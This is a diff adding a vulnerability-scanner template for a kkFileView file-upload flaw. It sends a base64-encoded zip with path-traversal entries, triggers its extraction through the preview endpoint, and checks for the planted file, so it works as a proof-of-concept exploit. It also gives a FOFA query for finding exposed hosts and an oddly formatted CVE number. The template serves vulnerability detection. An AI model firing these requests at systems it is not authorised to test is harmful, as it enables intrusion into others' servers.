@@ -1,0 +1,111 @@
+id: 2024-105061349 # 
+
+info:
+  name: kkFileView 任意文件上传致远程代码执行漏洞 # 必填，漏洞名
+  author: k3ppf0r # 必填，作者
+  severity: high # 必填，严重程度，critical, high, medium, low, info
+  description: |
+    kkFileView是一个开源在线文件预览解决方案。2024年4月，互联网公开披露kkFileView 任意文件上传致远程代码执行漏洞，攻击者可构造恶意请求上传恶意文件，并可能造成远程代码执行。
+  reference:
+    - https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778
+  remediation: |
+    1、待官方发布后升级至安全版本
+    2、利用安全组设置其仅对可信地址开放。
+  classification:
+    # cvss-metrics: CVSS
+    # cvss-score: 9
+    cve-id: 2024-105061349
+    cwe-id: CWE-434
+    # cpe: # 可选：cpe:2.3:a:vmware:spring_cloud_function:*:*:*:*:*:*:*:*
+  metadata:
+    date: 2024-04-17 # 必填，纰漏时间，例：2019-09-22
+    version: 4.2.0 <= kkFileView <= 4.4.0-beta
+    fofa-query: body="kkFileView"
+  tags: cve,cve2024,kkFileView,rce
+
+
+flow: http(1) && http(2) && http(3)
+
+
+http:
+  - raw:
+    - |
+      POST /fileUpload HTTP/1.1
+      Host: {{Hostname}}
+      Content-Length: 535
+      sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+      Accept: application/json, text/javascript, */*; q=0.01
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6apTnBWAuxKkis4i
+      X-Requested-With: XMLHttpRequest
+      sec-ch-ua-mobile: ?0
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+      sec-ch-ua-platform: "Windows"
+      Sec-Fetch-Site: same-origin
+      Sec-Fetch-Mode: cors
+      Sec-Fetch-Dest: empty
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+
+      ------WebKitFormBoundary6apTnBWAuxKkis4i
+      Content-Disposition: form-data; name="file"; filename="test1.zip"
+      Content-Type: application/x-zip-compressed
+
+      {{ base64_decode("UEsDBBQAAAAIAFtwplhdV2IIAwAAAAEAAAAEAAAAdGVzdMsGAFBLAwQUAAAACABbcKZYKoXqORMAAAARAAAAQQAAAC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3RtcC9mbGFny0hMzk5NiU+qjM82LihIMygCAFBLAQIUABQAAAAIAFtwplhdV2IIAwAAAAEAAAAEAAAAAAAAAAAAAACAAQAAAAB0ZXN0UEsBAhQAFAAAAAgAW3CmWCqF6jkTAAAAEQAAAEEAAAAAAAAAAAAAAIABJQAAAC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3RtcC9mbGFnUEsFBgAAAAACAAIAoQAAAJcAAAAAAA==") }}
+      ------WebKitFormBoundary6apTnBWAuxKkis4i--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "SUCCESS")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |+
+        GET /onlinePreview?url=aHR0cDovLzEyNy4wLjAuMTo4MDEyL2RlbW8vdGVzdDEuemlw HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+        internal: true
+
+  - raw:
+      - |+
+        GET /directory?urls=dGVzdDEuemlwXw%3D%3D HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        sec-ch-ua-mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+        sec-ch-ua-platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - test1.zip_
+
